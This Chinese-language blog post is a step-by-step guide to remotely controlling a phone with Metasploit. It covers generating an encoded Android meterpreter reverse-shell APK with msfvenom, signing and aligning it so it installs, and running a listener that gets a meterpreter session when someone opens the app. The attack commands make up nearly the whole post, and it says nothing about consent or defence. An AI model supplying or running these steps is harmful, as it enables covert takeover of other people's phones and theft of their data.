title: 使用Metasploit远控你的手机
categories: 干货
tags: [Metasploit,远控]
date: 2020-09-15 19:49:00
---
# 安装MetaSploit
>我的环境是:Kubuntu20.04

一键脚本:
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall &&   chmod 755 msfinstall &&   ./msfinstall
```
然后就无了

# 生成一个远控程序
```bash
msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=10.0.0.155 LPORT=52130 -f exe > test.apk

-p 攻击载荷
-e 编码方式
-i 编码次数
-b 在生成的程序中避免出现的值
LHOST,LPORT 监听上线的主机IP和端口
-f exe 生成EXE格式
```

>我们已经成功创建了Android格式（APK）文件的有效载荷。现在一般Android的移动设备不允许安装没有适当签名证书的应用程序。 Android设备只安装带有签署文件的APK。

我们可以使用如下工具进行手动签名：
>Keytool (已安装)
>jarsigner (需要安装)
>zipalign (需要安装)

执行下列命令签名。首先使用密钥工具创建密钥库。
```bash
keytool -genkey -v -keystore my-release-key.Keystore -alias wdnmd -keyalg RSA -keysize 2048 -validity 10000
```
然后使用JARsigner签名APK
```bash
apt install openjdk-14-headless #安装Java

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore test.apk wdnmd #签名APK

jarsigner -verify -verbose -certs test.apk #验证签名
```
使用zipalign优化APK
```bash
apt install zipalign #安装zipalign
zipalign -v 4 test.apk NEWtest.apk
```
#使用Metasploit进行测试
接下来启动metasploit的监听器。执行`msfconsole`打开控制台
```bash
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 10.0.0.155
set lport 52130
exploit
```
如有人打开**NEWtest.apk(MainActivity.apk)**时，则会出现等待输入界面
```bash
meterpreter >
```
输入`help`获得帮助